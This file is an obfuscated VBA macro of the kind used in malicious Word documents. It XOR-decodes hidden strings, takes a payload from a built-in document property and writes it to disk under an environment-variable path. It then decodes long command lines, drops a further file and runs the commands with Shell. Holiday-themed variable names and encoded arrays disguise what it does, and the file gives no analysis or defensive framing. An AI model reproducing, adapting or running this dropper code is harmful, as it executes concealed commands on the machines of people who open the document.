Private Function funkyfunc(variant_special As Variant, Number As Integer)
Dim variable1, string1 As String, intVar, variable2
string1 = "lNnNvluhiuVumq5qcrKMpDwul9w3OGOgfZNG7HfGRPumvi7mr5aCzAhPTSFzfQUOUwhTrPvda3KnW3cqmvCFBtTiIIHTtl7SgSaWYGiWtnQqnjvkKOOmch7PtSysCzEQxgGDpMMAkPBgvPcmyjbEKXT5oh5qynrPDoWdUUu47eIqyLvZ8Iyh22zEYHeQ5sIBRm4y818rTQnOyjv2vQ5LvGC5Lq1LtcGfF0rdxU0pupqaS5y53B8114yS2g7Wm2zrxsl8KA6axRtCnVLHVnlRklXlQlBSgdJ78GYxNBlSPCiOgN2noVNSOG4851uzJpFYyqtIo5UMiaMvgYj9dK4QfHRgBKUuobSvCYhTurOQyw8ljnTUIu7KItsggyQsPkf7el9Q9k9Rdg5fiqFNssiSje10dBNmUQkYCMbhVjfSp1IPz8kvSMpTjMvRhqA1aNLDqtQq1KgWZBEFea2frsOmp3P0WVz5610eh1Ykyn1He4eHrxw04UD1b6L623Zj97x66Gug2Ep2f9HCefW9lyRMaxwydT09aFiEZOUZGhBozRGB5Oj3yojV59FrFjwj7AdhJFXhEsDGOXZ9phlEbaE6EjvZ9KUyvpva6xFlP1kv631voY0iwGPQud9azxuIqMmRJpY1L4MxglqHYR32fulzvvTkukAHVx5vAAv71Qn6u5eaGVY1Vxt05kmYRIRLfJa4gwrj0HLPWaS7jNkq8xAk1zzfKT4I5UQeWgaAoC9ZTlcuzIl1GUPQ4ZhrdWJTcPXd241vUAQXqz9aJzgEf4oyFAORPt7BpO1t8rvcxFwW7MJtFy8DqkcK2Swv1godidj8JjFKxnXcaDfuZghqTbHKNUDZmla0KemNVnIXKPhdVWPquQU9Z4PMxtbB4y29zivFB6yzvzS11RomVTOUjNrsUoOnY5iwI1RfDh2B5t1NY8fAgQJtR3hfZjaJFCqqj19so1XT6ipjfF"
variable1 = ""
intVar = 1
While intVar < UBound(variant_special) + 2
variable2 = intVar Mod Len(string1): If variable2 = 0 Then variable2 = Len(string1)
variable1 = variable1 + Chr(Asc(Mid(string1, variable2 + Number, 1)) Xor CInt(variant_special(intVar - 1)))
intVar = intVar + 1
Wend
funkyfunc = variable1
End Function
Sub subProcedure()
Dim p As DocumentProperty
For Each p In ActiveDocument.BuiltInDocumentProperties
If p.Name = funkyfunc(Array(43, 6, 24, 59, 16, 3, 5, 70), 7) Then
wayOfSanta = CStr(Environ(funkyfunc(Array(45, 62, 30, 10, 23, 24, 20), 0)) & funkyfunc(Array(18, 56, 54, 20, 17, 127, 5, 73, 63), 445))
Dim fso As Object
Set fso = CreateObject(funkyfunc(Array(34, 0, 0, 34, 61, 4, 45, 25, 18, 66, 127, 30, 95, 42, 20, 54, 20, 18, 63, 35, 8, _
85, 34, 3, 36, 38), 15))
Dim oFile As Object
Set oFile = fso.CreateTextFile(wayOfSanta)
oFile.WriteLine p.Value
oFile.Close
End If
Next
christmas = funkyfunc(Array(60, 30, 21, 108, 3, 47, 9, 4, 111, 92, 72, 36, 61, 4, 4, 86, 17, 92, 59, 20, 3, _
65, 83, 66, 24, 62, 45, 95, 47, 2, 11, 1, 95, 37, 0, 90, 17, 21, 72, 66, 48, _
85, 64, 19, 43, 93, 6, 83, 62, 102, 83, 71, 50, 66, 30, 118, 8, 70, 90, 46, 22, _
6, 70, 44, 31, 92, 34, 88, 60, 34, 66, 79, 119, 18, 76, 94, 14, 57, 19, 29, 18, _
54, 22, 58, 81, 84, 4, 40, 29, 32, 40, 97, 48, 34, 34, 79, 110, 79, 33, 17, 40, _
44, 67, 42, 24, 71, 36, 85, 80, 16, 71, 86, 43, 48, 39, 25, 18, 92, 3, 18, 16, _
26, 35, 40, 63, 64, 30, 58, 11, 105, 9, 49, 54, 92, 45, 82, 86, 23, 7, 0, 33, _
119, 41, 6, 34, 63, 65, 63, 125, 34, 51, 30, 0, 8, 68, 23, 40, 1, 53, 95, 31, _
43, 12, 9, 118, 19, 27, 31, 95, 5, 19, 34, 34, 1, 20, 16, 81, 73, 93, 57, 5, _
57, 29, 36, 14, 51, 62, 25, 54, 95, 8, 85, 57, 25, 64, 69, 81, 99, 121, 117, 111, _
70, 20, 16, 9, 84, 2, 14, 32, 76, 92, 66, 104), 454)
claus = CStr(Environ(funkyfunc(Array(45, 62, 30, 10, 23, 24, 20), 0)) & funkyfunc(Array(15, 37, 17, 34, 15, 18, 16, 39, 6, 95, 49, 66, 80), 432))
Open claus For Output As #1
Print #1, christmas
Close #1
christmas1 = funkyfunc(Array(80, 26, 17, 37, 8, 114, 8, 63, 22, 120, 34, 51, 15, 55, 6, 19, 3, 22, 51, 43, 123, _
8, 15, 63, 53, 15, 80, 17, 17, 18, 38, 99, 24, 37, 56, 21, 24, 47, 22, 69, 47, _
14, 55, 41, 47, 14, 11, 2, 34, 39, 80, 18, 60, 18, 62, 38, 2, 30, 4, 19, 63, _
38, 0, 124, 49, 47, 12, 3, 0, 17, 5, 50, 55, 51, 4, 47, 40, 43, 37, 0, 10, _
60, 21, 119, 0, 41, 118, 22, 56, 36, 5, 18, 6, 46, 31, 37, 20, 54, 52, 118, 68, _
36, 14, 26, 56, 21, 1, 24, 80, 8, 49, 57, 115, 83, 43, 7, 47, 9, 34, 101, 116, _
33, 8, 0, 58, 44, 124, 40, 121, 104, 105, 51, 58, 16, 45, 36, 56, 35, 55, 115, 4, _
16, 118, 13, 55, 13, 52, 119, 47, 48, 118, 43, 53, 58, 22, 36, 116, 113, 53, 49, 57, _
13, 71, 50, 24, 49, 57, 52, 18, 87, 30, 116, 70, 3, 112, 112, 112, 87, 14, 18, 74, _
38, 116, 52, 44, 121, 43, 51, 17, 50, 47, 121, 10, 13, 103, 35, 62, 19, 60, 36, 47, _
12, 29, 10, 60, 47, 36, 7, 42, 8, 25, 46, 33, 45, 5, 107, 38, 6, 45, 117, 105, _
6, 30, 64, 15, 32, 45, 17, 32, 2, 46, 2, 38, 43, 99, 47, 8, 23, 11, 26, 14, _
34, 101, 122, 66, 112, 50, 63, 11, 19, 49, 27, 3, 48, 55, 8, 46, 121, 4, 15, 38, _
32, 10, 78, 38, 12, 43, 123, 29, 10, 115, 105, 39, 18, 53, 37, 50, 10, 18, 2, 46, _
56, 2, 55, 36, 24, 43, 100, 52, 36, 56, 19, 9, 54, 127, 88, 43, 52, 21, 23, 63, _
52, 127, 40, 8, 33, 4, 37, 87, 56, 25, 24, 17, 9, 39, 117, 9, 45, 122, 16, 120, _
56, 120, 16, 20, 38, 114, 55, 40, 43, 7, 12, 31, 50, 46, 103, 43, 44, 112, 113, 16, _
3, 11, 89, 20, 51, 28, 27, 5, 12, 42, 15, 23, 11, 55, 17, 64, 112, 8, 63, 59, _
26), 68)
christmas2 = funkyfunc(Array(106, 28, 31, 116, 31, 0, 2, 39, 118, 122, 16, 44, 84, 52, 112, 48, 32, 37, 49, 27, 3, _
23, 63, 31, 113, 86, 12, 47, 47, 19, 14, 102, 13, 4, 27, 35, 88, 38, 48, 70, 43, _
84, 9, 14, 52, 22, 37, 60, 118, 37, 41, 41, 57, 121, 63, 20, 42, 85, 59, 56, 33, _
10, 19, 12, 8, 87, 20, 19, 14, 22, 32, 52, 0, 12, 36, 123, 11, 21, 43, 38, 52, _
30, 8, 46, 94, 6, 22, 55, 16, 126, 45, 42, 48, 37, 31, 11, 21, 0, 17, 26, 23, _
115, 115, 90, 55, 12, 54, 19, 48, 48, 50, 104, 32, 43, 43, 37, 51, 39, 115, 91, 56, _
20, 0, 13, 58, 17, 60, 102, 3, 41, 30, 112, 26, 121, 49, 29, 34, 49, 7, 54, 37, _
118, 14, 11, 53, 12, 14, 122, 39, 48, 35, 50, 10, 81, 52, 53, 26, 112, 32, 58, 37, _
61, 19, 40, 65, 11, 45, 114, 10, 33, 63, 26, 23, 32, 3, 51, 52, 56, 0, 42, 65, _
21, 37, 29, 10, 45, 50, 5, 47, 44, 43, 52, 113, 46, 36, 47, 34, 23, 45, 42, 25, _
0, 1, 41, 13, 23, 22, 63, 48, 87), 667)
chris1 = funkyfunc(Array(32, 26, 26, 19, 27, 68, 5, 23, 89, 13, 99, 87, 4, 6, 51, 59, 55, 35, 30, 37, 62, _
56, 34, 52, 25, 12, 116), 41) & christmas1
chris2 = funkyfunc(Array(73, 53, 67, 53, 63, 11, 28, 7, 46, 88, 89, 31, 124, 2, 12, 21, 51, 54, 95, 22, 20, _
38, 21, 63, 88, 82, 43, 79, 47, 47, 36, 46, 38, 25, 110, 95, 61, 58, 63, 61, 1, _
63, 92, 5, 18, 105, 28, 5, 15, 42, 12, 93, 53, 102, 0, 72, 34, 60, 24, 46, 40, _
3, 53, 47, 26, 114, 30, 38, 9, 31, 18, 8, 62, 102, 110, 52, 31, 9, 94, 93, 22, _
11, 114, 55, 57, 91, 8, 30, 14, 70), 879) & christmas2
Shell (chris1)
Shell (chris2)
End Sub
